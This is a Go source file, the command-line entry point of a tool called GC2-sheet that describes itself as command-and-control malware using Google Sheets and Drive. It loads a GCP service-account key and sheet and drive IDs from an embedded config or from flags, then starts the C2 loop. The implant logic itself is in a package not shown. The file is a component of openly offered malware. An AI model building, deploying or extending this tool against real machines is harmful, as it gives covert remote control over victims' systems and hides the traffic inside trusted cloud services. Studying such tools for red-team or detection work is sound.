package cmd

import (
	"GC2-sheet/internal/C2"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	_ "embed"
	"os"

	"github.com/spf13/cobra"
	"gopkg.in/yaml.v2"
)

var (
	credentialFlag string
	sheetIdFlag    string
	driveIdFlag    string
	debugFlag      bool
	//go:embed options.yml
	configurationFileContent []byte
)

var rootCmd = &cobra.Command{
	Use:   "gc2-sheet",
	Short: "gc2-sheet new C2 malware that uses Google Sheet as command & control.",
	Long:  `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
	Run: func(cmd *cobra.Command, args []string) {

		// If flags have not been used, get the configuration file
		if credentialFlag == "" || sheetIdFlag == "" || driveIdFlag == "" {

			configurationFile := configuration.ConfigurationFile{}

			yaml.Unmarshal(configurationFileContent, &configurationFile)

			configuration.SetOptions(configurationFile.Key, configurationFile.Sheet, configurationFile.Drive, configurationFile.Verbose)

			utils.LogDebug("Using configuration file")
		} else { // Using standard flags
			var key []byte

			if credentialFlag != "" {
				var err error
				key, err = os.ReadFile(credentialFlag)
				if err != nil {
					utils.LogFatalDebug("Key file not found")
				}
			}
			configuration.SetOptions(string(key), sheetIdFlag, driveIdFlag, debugFlag)
			utils.LogDebug("Using flags")
		}

		C2.Run()

	},
}

func init() {

	rootCmd.Flags().StringVarP(&credentialFlag, "key", "k", "", "GCP service account credential in JSON")

	rootCmd.Flags().StringVarP(&sheetIdFlag, "sheet", "s", "", "Google sheet ID")

	rootCmd.Flags().StringVarP(&driveIdFlag, "drive", "d", "", "Google drive ID")

	rootCmd.Flags().BoolVarP(&debugFlag, "verbose", "v", false, "Enable verbose output")
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {

		os.Exit(1)
	}
}
